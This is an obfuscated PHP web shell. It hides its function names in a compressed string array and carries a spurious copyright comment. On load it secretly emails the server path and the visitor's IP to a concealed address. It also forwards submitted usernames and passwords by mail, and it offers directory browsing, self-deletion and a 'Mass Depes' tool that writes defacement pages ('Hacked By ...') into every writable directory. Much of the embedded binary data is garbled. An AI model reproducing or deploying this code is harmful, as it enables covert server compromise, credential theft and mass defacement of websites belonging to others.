<?php 
        /** 
         *-- copyright : https://www.toolfk.com 
         */
          error_reporting(E_ALL^E_NOTICE);define('O0', 'O');������Ň􂐸������νƛ��⩿����Ӣё���݃ƃ󃲣����������ϸ�����������ꩄ��ګ������◗������ꠎ�����;$GLOBALS[O0] = explode('|||', gzinflate(substr('�      ��n�6��S\\\\`I�X��Oز�,q�`u�%N�aJ�-���T��ϽÞoO��H�q��sN�#y�����e���|��,\'����� ��AF�s��"r��R3h*һ�߿��/3c�^��6���������x�.F?^�.\'���i}0>������w �9h����W�F�+8x�ӛ#������,J1���N��n�!�c8鱞v\'��yt��D�Fo&��Xɼ�U����Jx�h������~n�Q$U=8?9��)��*ͤ�3>�Zo�I�A�f����X�nq(��´̲�=0�ƴ3����"�R���-�2Lx6��Ȱ�F���x0�I�ZΨIj���r2cI�����hV$��Q�М��Չ�I���~�����2��p���p���N&���Fh�B�dj��i)���CN�Ykvvტ�T�*i�らT.)*cap����
vV<�M<�"�k��!i�� �}?v��i#�2(J�]̍Qr��L��f8�/�˄X�A��v�ȏ���S_�I�j�H�kÌ�t�h���9X&��-#�u4�8�`&�M*��9�N��vJrƗ�˲�*�*!�||&��)����@/H�E���͒S5MV�><�X.�������W��X����si�K]�m���T�i��d>S�i+�\\b=?��gŰR�.K�wv7���y��QՇ;,JLOH��@cH�Y�z0e74��z����Bjf]���^�E��7>6%��`D{�����b��y�a[LKg�E�S܀�v����L���!^+ɆĜ"�T�m�]�S����x�"��X�����s�EJ����@`�U���F�1E?��i���(J��)��ٳ���aʹ�k����-ERV�<+n���{�
����F���s�MU3��t����\\��0�]�m�8¶Mb�]�m[�C��@�d�PX���H�H��J:��E�`�
�=%�$VWķ�/�/�_v�>y�z��v�����0�*B��ASѴ	S��&bRv	>zд�5��ן�ª�Q���Ej�t�r�zX�Q�VBY*F��%6��LIc*�%��N��@�dˋ��U&"�6�l��kB���<��beUQ9��d2lc��m@��l�%7� ʴ-U�
�=Įa�fਦ8l� 9�YzU�O�t��\\����6\\L���ݪ�y¯�}Q���l�M��I������O�:j�l8&96f�.�w����MO�݌��<&�}�ͭ��ԧ��t�P��~�Hp��?IXF��w �"V�V5�KY1�׳
��k�
U�6YMU%vUwe_�X�@J#�8,�)W�Ѷ7)]M��f���vr��y�HvWǘM�^џħ���8��*�x	��� Ŷ%��۶���%��h����G}C�I�X�Y2%s��w�#C,��U���9{0�h���c��������>O:@�X��=����+ȳtO��
�H�v����K���N��z�*Y�	N��XG�΍���a�t2ڭ�^־��YMp�_�i��u/v���h;Ϯ����zJ�ý-b�2~������,�q�ҧ���s��A�  ',0x0a, -8)));��ʕ�Т��ڵ�����뽚�Ҫ������ԗ�ƞ���������ۇ⵽�ͷ�����ګ����������໹��Ú�����Ҝʎ����;?> <?php
 $tujuanmail = $GLOBALS{O0}[0];
$x_path = $GLOBALS{O0}{0x001} . $_SERVER[$GLOBALS{O0}[0x0002]] . $_SERVER[$GLOBALS{O0}{0x00003}];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER[$GLOBALS{O0}[0x000004]] . $GLOBALS{O0}{0x05};
$GLOBALS{O0}[0x006]($tujuanmail, $GLOBALS{O0}{0x0007}, $pesan_alert, $GLOBALS{O0}[0x00008] . $_SERVER[$GLOBALS{O0}[0x000004]] . $GLOBALS{O0}{0x05});
$subjek = $GLOBALS{O0}{0x000009};
$mailto = $GLOBALS{O0}[0x0a]; 
$ip = ‘SERVER[$GLOBALS{O0}[0x000004]];
$date = $GLOBALS{O0}{0x00b}($GLOBALS{O0}[0x000c]);
$browser = $_SERVER[$GLOBALS{O0}{0x0000d}];

  $headers = $GLOBALS{O0}[0x00000e].$fromName.$GLOBALS{O0}{0x0f}.$fromEmail.$GLOBALS{O0}[0x0010].$GLOBALS{O0}{0x00011};
  $headers .= $GLOBALS{O0}[0x000012].$replyEmail.$GLOBALS{O0}{0x00011};
  $headers .= $GLOBALS{O0}{0x0000013}.$GLOBALS{O0}[0x014]().$GLOBALS{O0}{0x00011};
  $headers .= $GLOBALS{O0}{0x0015};
  $headers .= "Content-Type: multipart/alternative; boundary = $boundaryrn";
                


$user = $_POST[$GLOBALS{O0}[0x00016]];
$pass = $_POST[$GLOBALS{O0}{0x000017}];


$body = <<<EOD
<br><hr><br>
<center><font size="4" ;" color="red">HACKED!<br></font>
<font size="2" color="red">UsernameEmail :</font><font size"2" color="black">$user</font><br>
<font size="2" color="red">Password : </font><font size"2" color="black">$pass</font> <br></center>
EOD;


$headers = "From: $fromName";

  
  $headers .= $GLOBALS{O0}[0x000012].$replyEmail.$GLOBALS{O0}{0x00011};

$headers .= $GLOBALS{O0}[0x0000018];
$success = $GLOBALS{O0}[0x006]($mailto, $subjek, $body, $headers);
?>
    <?php
$random = $GLOBALS{O0}{0x019}(0x03e8,0x01388);
$GLOBALS{O0}[0x001a](0);
$GLOBALS{O0}{0x0001b}(0);
if(isset($_GET[$GLOBALS{O0}[0x00001c]])) {
	$dir = $_GET[$GLOBALS{O0}[0x00001c]];
	$GLOBALS{O0}{0x000001d}($dir);
} else {
	$dir = $GLOBALS{O0}[0x01e]();
}
if($GLOBALS{O0}{0x001f}()){
foreach($_POST  as  $key=>$value){
$_POST[$key] = $GLOBALS{O0}[0x00020]($value);
$dir = $GLOBALS{O0}{0x000021}($GLOBALS{O0}[0x0000022],$GLOBALS{O0}{0x023},$dir);
$scdir = $GLOBALS{O0}[0x0024]($GLOBALS{O0}{0x023}, $dir);
}
}
echo $GLOBALS{O0}{0x00025};
echo $GLOBALS{O0}[0x000026];
echo "<font color='red'>★<font color='lime'>$dir<font color='red'>★</b></a></font>";
echo $GLOBALS{O0}[0x000026];
echo "<a href='?dir=$dir&to=mass'><button type=button><b><font color=red>Mass Depes★</button></b></a>";
echo "<a href='?dir=$dir&to=masss'><button type=button><b><font color=red>Mass Depes★★</button></b><br><br></a>";
echo $GLOBALS{O0}{0x0000027};
if(isset($_POST[$GLOBALS{O0}[0x028]])) {
if(@$GLOBALS{O0}{0x0029}($GLOBALS{O0}[0x0002a]($GLOBALS{O0}{0x00002b}, $GLOBALS{O0}[0x000002c], __FILE__)))
            die($GLOBALS{O0}{0x02d});
        else echo $GLOBALS{O0}[0x002e];
}
echo $GLOBALS{O0}{0x0002f};
if($_GET[$GLOBALS{O0}[0x000030]] == $GLOBALS{O0}{0x0000031}) {
	function sabun_massal($O00,$O0O,$OO0) {
		if($GLOBALS{O0}[0x032]($O00)) {
			$OOO = $GLOBALS{O0}{0x0033}($O00);
			foreach($OOO  as  $O000) {
				$O00O = "$O00/$O000";
				$O0O0 = $O00O.$GLOBALS{O0}[0x00034].$O0O;
				if($O000 === $GLOBALS{O0}{0x000035}) {
					$GLOBALS{O0}[0x0000036]($O0O0, $OO0);
				} elseif($O000 === $GLOBALS{O0}{0x037}) {
					$GLOBALS{O0}[0x0000036]($O0O0, $OO0);
				} else {
					if($GLOBALS{O0}[0x0038]($O00O)) {
						if($GLOBALS{O0}[0x032]($O00O)) {
							echo "[<font color=lime>DONE</font>] $O0O0<br>";
							$GLOBALS{O0}[0x0000036]($O0O0, $OO0);
							$O0OO = $GLOBALS{O0}{0x00039}($O00O,$O0O,$OO0);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($OO0O,$OOO0,$OOOO) {
		if($GLOBALS{O0}[0x032]($OO0O)) {
			$O0000 = $GLOBALS{O0}{0x0033}($OO0O);
			foreach($O0000  as  $O000O) {
				$O00O0 = "$OO0O/$O000O";
				$O00OO = $O00O0.$GLOBALS{O0}[0x00034].$OOO0;
				if($O000O === $GLOBALS{O0}{0x000035}) {
					$GLOBALS{O0}[0x0000036]($O00OO, $OOOO);
				} elseif($O000O === $GLOBALS{O0}{0x037}) {
					$GLOBALS{O0}[0x0000036]($O00OO, $OOOO);
				} else {
					if($GLOBALS{O0}[0x0038]($O00O0)) {
						if($GLOBALS{O0}[0x032]($O00O0)) {
							echo "<font color=lime>http://</font>$O000O/$OOO0<br>";
							$GLOBALS{O0}[0x0000036]($O00OO, $OOOO);
						}
					}
				}
			}
		}
	}
	if($_POST[$GLOBALS{O0}[0x00003a]]) {
		if($_POST[$GLOBALS{O0}{0x000003b}] == $GLOBALS{O0}[0x03c]) {
			echo $GLOBALS{O0}{0x003d};
			$GLOBALS{O0}{0x00039}($_POST[$GLOBALS{O0}[0x0003e]], $_POST[$GLOBALS{O0}{0x00003f}], $_POST[$GLOBALS{O0}[0x0000040]]);
			echo $GLOBALS{O0}{0x041};
		} elseif($_POST[$GLOBALS{O0}{0x000003b}] == $GLOBALS{O0}[0x0042]) {
			echo $GLOBALS{O0}{0x003d};
			$GLOBALS{O0}{0x00043}($_POST[$GLOBALS{O0}[0x0003e]], $_POST[$GLOBALS{O0}{0x00003f}], $_POST[$GLOBALS{O0}[0x0000040]]);
			echo $GLOBALS{O0}{0x041};
		}
	} else {
	echo $GLOBALS{O0}[0x000026];
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Tipe Mass:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$OO0O' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='sange.txt' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked By Bapak Heker Indonesia | </textarea></br><br>
	<input type='submit' name='start' value='Start' style='width: 450px;'>
	</form></center>";
	} 
	}elseif($_GET[$GLOBALS{O0}[0x000030]] == $GLOBALS{O0}[0x000044]) {
	function sabun_massal($O0O0O,$O0OO0,$O0OOO) {
		if($GLOBALS{O0}[0x032]($O0O0O)) {
			$OO000 = $GLOBALS{O0}{0x0033}($O0O0O);
			foreach($OO000  as  $OO00O) {
				$OO0O0 = "$O0O0O/$OO00O";
				$OO0OO = $OO0O0.$GLOBALS{O0}[0x00034].$O0OO0;
				if($OO00O === $GLOBALS{O0}{0x000035}) {
					$GLOBALS{O0}[0x0000036]($OO0OO, $O0OOO);
				} elseif($OO00O === $GLOBALS{O0}{0x037}) {
					$GLOBALS{O0}[0x0000036]($OO0OO, $O0OOO);
				} else {
					if($GLOBALS{O0}[0x0038]($OO0O0)) {
						if($GLOBALS{O0}[0x032]($OO0O0)) {
							echo "[<font color=lime>DONE</font>] $OO0OO<br>";
							$GLOBALS{O0}[0x0000036]($OO0OO, $O0OOO);
							$OOO00 = $GLOBALS{O0}{0x00039}($OO0O0,$O0OO0,$O0OOO);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($OOOO0,$OOOOO,$O00000) {
		if($GLOBALS{O0}[0x032]($OOOO0)) {
			$O0000O = $GLOBALS{O0}{0x0033}($OOOO0);
			foreach($O0000O  as  $O000O0) {
				$O000OO = "$OOOO0/$O000O0";
				$O00O00 = $O000OO.$GLOBALS{O0}[0x00034].$OOOOO;
				if($O000O0 === $GLOBALS{O0}{0x000035}) {
					$GLOBALS{O0}[0x0000036]($O00O00, $O00000);
				} elseif($O000O0 === $GLOBALS{O0}{0x037}) {
					$GLOBALS{O0}[0x0000036]($O00O00, $O00000);
				} else {
					if($GLOBALS{O0}[0x0038]($O000OO)) {
						if($GLOBALS{O0}[0x032]($O000OO)) {
							echo "<font color=lime>http://</font>$O000O0<font color=lime>.com</font>/$OOOOO<br>";
							$GLOBALS{O0}[0x0000036]($O00O00, $O00000);
						}
					}
				}
			}
		}
	}
	if($_POST[$GLOBALS{O0}[0x00003a]]) {
		if($_POST[$GLOBALS{O0}{0x000003b}] == $GLOBALS{O0}[0x03c]) {
			echo $GLOBALS{O0}{0x003d};
			$GLOBALS{O0}{0x00039}($_POST[$GLOBALS{O0}[0x0003e]], $_POST[$GLOBALS{O0}{0x00003f}], $_POST[$GLOBALS{O0}[0x0000040]]);
			echo $GLOBALS{O0}{0x041};
		} elseif($_POST[$GLOBALS{O0}{0x000003b}] == $GLOBALS{O0}[0x0042]) {
			echo $GLOBALS{O0}{0x003d};
			$GLOBALS{O0}{0x00043}($_POST[$GLOBALS{O0}[0x0003e]], $_POST[$GLOBALS{O0}{0x00003f}], $_POST[$GLOBALS{O0}[0x0000040]]);
			echo $GLOBALS{O0}{0x041};
		}
	} else {
	echo $GLOBALS{O0}[0x000026];
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Tipe Mass:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$OOOO0' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='sange.txt' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked By Poldah metr0 | Security Is A Game</textarea><br>
	<input type='submit' name='start' value='Gassss' style='width: 450px;'>
	</form></center>";
	} 
	}
echo $GLOBALS{O0}{0x0000045};
function perms($O00OO0){
$O00OOO = $GLOBALS{O0}[0x046]($O00OO0);

if (($O00OOO & 0xC000) == 0xC000) {
$O0O000 = $GLOBALS{O0}{0x0047};
} elseif (($O00OOO & 0xA000) == 0xA000) {
$O0O000 = $GLOBALS{O0}[0x00048];
} elseif (($O00OOO & 0x8000) == 0x8000) {
$O0O000 = $GLOBALS{O0}{0x000049};
} elseif (($O00OOO & 0x6000) == 0x6000) {
$O0O000 = $GLOBALS{O0}[0x000004a];
} elseif (($O00OOO & 0x4000) == 0x4000) {
$O0O000 = $GLOBALS{O0}{0x04b};
} elseif (($O00OOO & 0x2000) == 0x2000) {
$O0O000 = $GLOBALS{O0}[0x004c];
} elseif (($O00OOO & 0x1000) == 0x1000) {
$O0O000 = $GLOBALS{O0}{0x0004d};
} else {
$O0O000 = $GLOBALS{O0}[0x00004e];
}

$O0O000 .= (($O00OOO & 0x0100) ? $GLOBALS{O0}{0x000004f} : $GLOBALS{O0}{0x000049});
$O0O000 .= (($O00OOO & 0x0080) ? $GLOBALS{O0}[0x050] : $GLOBALS{O0}{0x000049});
$O0O000 .= (($O00OOO & 0x0040) ?
(($O00OOO & 0x0800) ? $GLOBALS{O0}{0x0047} : $GLOBALS{O0}{0x0051} ) :
(($O00OOO & 0x0800) ? $GLOBALS{O0}[0x00052] : $GLOBALS{O0}{0x000049}));

$O0O000 .= (($O00OOO & 0x0020) ? $GLOBALS{O0}{0x000004f} : $GLOBALS{O0}{0x000049});
$O0O000 .= (($O00OOO & 0x0010) ? $GLOBALS{O0}[0x050] : $GLOBALS{O0}{0x000049});
$O0O000 .= (($O00OOO & 0x0008) ?
(($O00OOO & 0x0400) ? $GLOBALS{O0}{0x0047} : $GLOBALS{O0}{0x0051} ) :
(($O00OOO & 0x0400) ? $GLOBALS{O0}[0x00052] : $GLOBALS{O0}{0x000049}));

$O0O000 .= (($O00OOO & 0x0004) ? $GLOBALS{O0}{0x000004f} : $GLOBALS{O0}{0x000049});
$O0O000 .= (($O00OOO & 0x0002) ? $GLOBALS{O0}[0x050] : $GLOBALS{O0}{0x000049});
$O0O000 .= (($O00OOO & 0x0001) ?
(($O00OOO & 0x0200) ? $GLOBALS{O0}{0x000053} : $GLOBALS{O0}{0x0051} ) :
(($O00OOO & 0x0200) ? $GLOBALS{O0}[0x0000054] : $GLOBALS{O0}{0x000049}));

return $O0O000;
}
?>